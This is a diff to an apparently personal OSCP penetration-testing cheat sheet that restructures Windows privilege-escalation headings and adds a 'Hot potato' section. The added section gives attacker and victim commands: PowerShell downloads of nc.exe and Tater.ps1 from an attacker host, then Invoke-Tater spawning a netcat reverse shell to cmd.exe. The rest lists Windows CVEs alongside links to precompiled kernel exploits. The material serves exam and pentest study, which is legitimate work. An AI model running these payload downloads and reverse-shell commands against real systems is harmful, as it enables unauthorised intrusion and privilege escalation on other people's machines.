@@ -175,12 +175,14 @@ description: "OSCP personal cheat sheet"
   * [Unquoted service paths](#unquoted-service-paths)
     + [Detection](#detection-5)
     + [Exploitation](#exploitation-5)
-    + [CVE](#cve)
-      - [Windows XP](#windows-xp)
-      - [Windows 7](#windows-7)
-      - [Windows 8](#windows-8)
-      - [Windows 10](#windows-10)
-      - [Windows Server 2003](#windows-server-2003)
+  * [Hot potato](#hot-potato)
+    + [Exploitation](#exploitation-6)
+  * [CVE](#cve)
+    + [Windows XP](#windows-xp)
+    + [Windows 7](#windows-7)
+    + [Windows 8](#windows-8)
+    + [Windows 10](#windows-10)
+    + [Windows Server 2003](#windows-server-2003)
 - [PROOFS](#proofs)
   * [Linux](#linux-6)
   * [Windows](#windows-6)
@@ -1427,7 +1429,6 @@ https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
 
 ```
 https://guif.re/windowseop
-
 https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
 https://mysecurityjournal.blogspot.com/p/client-side-attacks.html
 http://www.fuzzysecurity.com/tutorials/16.html
@@ -1687,7 +1688,22 @@ powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/Commo
 sc start unquotedsvc
 ```
 
-#### CVE
+### Hot potato
+
+#### Exploitation
+
+```
+# Attacker
+sudo python -m SimpleHTTPServer 80
+sudo nc -lvp <PORT>
+
+# Victim
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/nc.exe', ".\nc.exe')
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/Tater.ps1.exe', ".\Tater.ps1.exe')
+powershell -exec bypass -command "& { Import-Module .\Tater.ps1; Invoke-Tater -Trigger 1 -Command '.\nc.exe <IP> <PORT> -e cmd.exe' }"
+```
+
+### CVE
 
 ```
 # Already compiled exploit
@@ -1695,7 +1711,7 @@ https://github.com/SecWiki/windows-kernel-exploits
 https://github.com/abatchy17/WindowsExploits
 ```
 
-##### Windows XP
+#### Windows XP
 
 |      CVE      | Description                                                  |
 | :-----------: | :----------------------------------------------------------- |
@@ -1714,7 +1730,7 @@ https://github.com/abatchy17/WindowsExploits
 | CVE-2011-5046 | EXPLOIT-DB 18275 - GDI in windows does not properly validate user-mode input - allows remote code execution |
 | CVE-2012-4349 | Unquoted windows search path - Windows provides the capability of including spaces in path names - can be root |
 
-##### Windows 7
+#### Windows 7
 
 |      CVE      | Description                                                  |
 | :-----------: | :----------------------------------------------------------- |
@@ -1727,7 +1743,7 @@ https://github.com/abatchy17/WindowsExploits
 | CVE-2015-0016 | ms15_004_tswbproxy -  abuses a process creation policy in Internet Explorer's sandbox - code execution |
 | CVE-2018-8494 | remote code execution vulnerability exists when the Microsoft XML Core Services MSXML parser processes user input |
 
-##### Windows 8
+#### Windows 8
 
 |      CVE      | Description                                                  |
 | :-----------: | ------------------------------------------------------------ |
@@ -1741,7 +1757,7 @@ https://github.com/abatchy17/WindowsExploits
 | CVE-2014-6352 | ms14_064_packager_python - exploits Windows Object Linking and Embedding (OLE) - arbitrary code execution |
 | CVE-2015-0002 | ntapphelpcachecontrol - NtApphelpCacheControl Improper Authorization Check - privilege escalation |
 
-##### Windows 10
+#### Windows 10
 
 |      CVE      | Description                                                  |
 | :-----------: | ------------------------------------------------------------ |
@@ -1754,7 +1770,7 @@ https://github.com/abatchy17/WindowsExploits
 | CVE-2015-2431 | MS15-080 - Vulnerabilities in Microsoft Graphics Component - Could Allow Remote Code Execution |
 | CVE-2015-2441 | MS15-091 - Vulnerabilities exist when Microsoft Edge improperly accesses objects in memory - allows remote code execution |
 
-##### Windows Server 2003
+#### Windows Server 2003
 
 |      CVE      | Description                                                  |
 | :-----------: | ------------------------------------------------------------ |
